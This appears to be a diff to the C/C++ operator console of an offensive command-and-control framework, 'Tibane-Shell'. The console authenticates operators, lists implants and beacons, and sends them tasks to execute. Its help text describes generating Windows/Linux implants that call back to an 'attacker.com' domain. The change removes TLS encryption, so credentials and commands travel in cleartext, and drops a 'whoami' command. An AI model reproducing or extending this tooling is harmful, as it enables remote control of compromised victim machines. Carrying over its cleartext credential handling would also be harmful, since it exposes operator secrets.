@@ -13,17 +13,6 @@
 #include <readline/history.h>
 #include <crypt.h>
 
-#include <openssl/evp.h>
-#include <openssl/x509v3.h>
-#include <openssl/rsa.h>
-#include <openssl/pem.h>
-#include <openssl/x509.h>
-#include <openssl/err.h>
-#include <openssl/ssl.h>
-#include <openssl/param_build.h>
-#include <openssl/core_names.h> 
-#include <openssl/sslerr.h>
-
 
 //#include "includes/session.h"
 //#include "includes/agent.h"
@@ -39,10 +28,8 @@ extern "C" {
 
 char *IP;
 int PORT;
-char current_operator[BUFFER_SIZE];
 
-const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage [*]\n"
-                                        "   whoami : shows logged in operator\n"
+const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage [*]\n\n"
                                         "   implants : show all active implants\n"
                                         "   beacons : show all active beacons\n"
                                         "   get-implant -os=[windows/linux] -channel=[https/tls] -domain=attacker.com:443 -o=/path/to/implant : generate implant\n"
@@ -80,20 +67,7 @@ class Communicate_ {
 
     public:
     int sock;
-    SSL_CTX *ctx;
-    SSL *ssl;
-
-
     int conn() {
-
-           // Initialize OpenSSL
-        SSL_library_init();
-        OpenSSL_add_all_algorithms();
-        SSL_load_error_strings();
-        ctx = SSL_CTX_new(TLS_client_method());
-        
-    
-
         int status;
         struct sockaddr_in serv_addr;
         serv_addr.sin_family = AF_INET;
@@ -109,16 +83,9 @@ class Communicate_ {
         if ((status = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
            printf("\nConnection Failed \n");
            return -1;
-        }
-
-        ssl = SSL_new(ctx);
-        SSL_set_fd(ssl, sock);
-        SSL_connect(ssl);
-
+       }
        return 0;
     }
-
-    
 
     bool authenticate() {
         char user[BUFFER_SIZE];
@@ -146,13 +113,11 @@ class Communicate_ {
         }
         cJSON_Delete(credentials);
     
-        //send(sock, creds, strlen(creds), 0);
-        SSL_write(ssl, creds, strlen(creds));
-
+        send(sock, creds, strlen(creds), 0);
         free(creds);
 
         char buffer[BUFFER_SIZE];
-        int bytes = SSL_read(ssl, buffer, sizeof(buffer) -1);//recv(sock, buffer, sizeof(buffer) -1, 0);
+        int bytes = recv(sock, buffer, sizeof(buffer) -1, 0);
         if (bytes <= 0) {
             perror("Recv Failed");
             return false;
@@ -169,7 +134,6 @@ class Communicate_ {
         
         if (strcmp(sign_in->valuestring, "true") == 0) {
             cJSON_Delete(response);
-            strncpy(current_operator, user,BUFFER_SIZE);
             return true;    
         }
         cJSON_Delete(response);
@@ -190,16 +154,13 @@ class SendInfo : public Communicate_ {
         cJSON_AddStringToObject(info, "action", "new-task");
         cJSON_AddStringToObject(info, "command", command);
         char *info_ = cJSON_Print(info);
-        //send(sock, info_, strlen(info_), 0);
-        SSL_write(ssl, info_, strlen(info_));
-        
+        send(sock, info_, strlen(info_), 0);
         cJSON_Delete(info);
         free(info_);
 
         char reply[BUFFER_SIZE];
         
-        SSL_read(ssl, reply, sizeof(reply)-1);
-        //recv(sock, reply, sizeof(reply), 0);
+        recv(sock, reply, sizeof(reply), 0);
     }
 
     void Quit() {
@@ -209,8 +170,7 @@ class SendInfo : public Communicate_ {
         }
         cJSON_AddStringToObject(info, "Info", "exit");
         char *info_ = cJSON_Print(info);
-        //send(sock, info_, strlen(info_), 0);
-        SSL_write(ssl, info_, strlen(info_));
+        send(sock, info_, strlen(info_), 0);
         cJSON_Delete(info);
         free(info_);
     }
@@ -230,17 +190,18 @@ class RetriveInfo : public Communicate_ {
         }
         cJSON_AddStringToObject(info, "Info", table);
         char *info_ = cJSON_Print(info);
-        //send(sock, info_, strlen(info_), 0);
-        SSL_write(ssl, info_, strlen(info_));
+        send(sock, info_, strlen(info_), 0);
+
         cJSON_Delete(info);
         free(info_);
 
         ssize_t bytes;
-        int bytes_received = SSL_read(ssl, info_container, MAX_SIZE);//recv(sock, info_container, MAX_SIZE, 0);
+        int bytes_received = recv(sock, info_container, MAX_SIZE, 0);
         if (bytes_received <= 0) {
             perror("recv failed");
             return NULL;
         }
+
         return info_container;
     }
 
@@ -269,21 +230,19 @@ class RetriveInfo : public Communicate_ {
         }
     
         // Send request
-        SSL_write(ssl, info_json, strlen(info_json));
-        //if (send(sock, info_json, strlen(info_json), 0) <= 0) {
-        //    perror("send failed");
-        //    free(info_json);
-        //    cJSON_Delete(info);
-        //    free(info_container);
-        //    return NULL;
-        //}
+        if (send(sock, info_json, strlen(info_json), 0) <= 0) {
+            perror("send failed");
+            free(info_json);
+            cJSON_Delete(info);
+            free(info_container);
+            return NULL;
+        }
 
         free(info_json);
         cJSON_Delete(info);
     
         // Receive response
-        
-        int bytes_received = SSL_read(ssl, info_container, MAX_SIZE); //recv(sock, info_container, MAX_SIZE, 0);
+        int bytes_received = recv(sock, info_container, MAX_SIZE, 0);
         if (bytes_received <= 0) {
             perror("recv failed");
             free(info_container);
@@ -307,13 +266,12 @@ class RetriveInfo : public Communicate_ {
         cJSON_AddNumberToObject(info, "task_id", task_id);
 
         char *info_ = cJSON_Print(info);
-        //send(sock, info_, strlen(info_), 0);
-        SSL_write(ssl, info_, strlen(info_));
+        send(sock, info_, strlen(info_), 0);
 
         cJSON_Delete(info);
         free(info_);
 
-        int bytes_received = SSL_read(ssl, info_container, MAX_SIZE);//recv(sock, info_container, MAX_SIZE, 0);
+        int bytes_received = recv(sock, info_container, MAX_SIZE, 0);
         if (bytes_received <= 0) {
             perror("recv failed");
             return NULL;
@@ -324,7 +282,7 @@ class RetriveInfo : public Communicate_ {
 
 char* beacon_command_generator(const char* text, int state) {
     static const char* commands[] = {
-        "info", "list-tasks", "new-task", "exit", "quit", "q", "whoami", NULL
+        "info", "list-tasks", "new-task", "exit", "quit", "q", NULL
     };
     
     static int list_index, len;
@@ -419,9 +377,7 @@ class Operator {
                 // print this data
                 DisplayCommandResponse(data);
                 free(data);
-            } else if (strncmp(cmd, "whoami", 6) == 0) {
-                printf("%s", current_operator);
-            }else {
+            } else {
                 printf("%s", beacon_shell_help);
             }
 
@@ -488,10 +444,6 @@ int main() {
     }
     recvinfo.sock = com.sock;
     sendinfo.sock = com.sock;
-    recvinfo.ssl = com.ssl;
-    recvinfo.ctx = com.ctx;
-    sendinfo.ssl = com.ssl;
-    sendinfo.ctx = com.ctx;
      
     int tries = 0;
     do {
@@ -511,7 +463,7 @@ int main() {
     rl_attempted_completion_function = shell_completion;
     using_history();
     while (true) {
-        char *cmd = readline("\n[ tibane-shell ] $ ");
+        char *cmd = readline("[ tibane-shell ] $ ");
         
         if (!cmd) {  // Handle Ctrl+D
             printf("Ctrl + D \n");
@@ -529,8 +481,6 @@ int main() {
         process_shell_command(cmd, recvinfo, sendinfo, op);
         free(cmd);
     }
-
-    return 0;
 }
 
 
@@ -581,9 +531,8 @@ void process_shell_command(const char* cmd, RetriveInfo recvinfo, SendInfo sendi
             DisplayTasksPerAgent(data);
             free(data);
         }
-    } else if (strncmp(cmd, "whoami", 6) == 0) {
-        printf("%s\n", current_operator);
-    }   else {
+    } 
+    else {
         printf("%s", tibane_shell_help);
     }
 }
@@ -597,7 +546,7 @@ char** shell_completion(const char* text, int start, int end) {
 
 char* command_generator(const char* text, int state) {
     static const char* commands[] = {
-        "implants", "beacon", "list-tasks", "whoami", "exit", "quit", "q", NULL
+        "implants", "beacon", "list-tasks", "exit", "quit", "q", NULL
     };
     
     static int list_index, len;
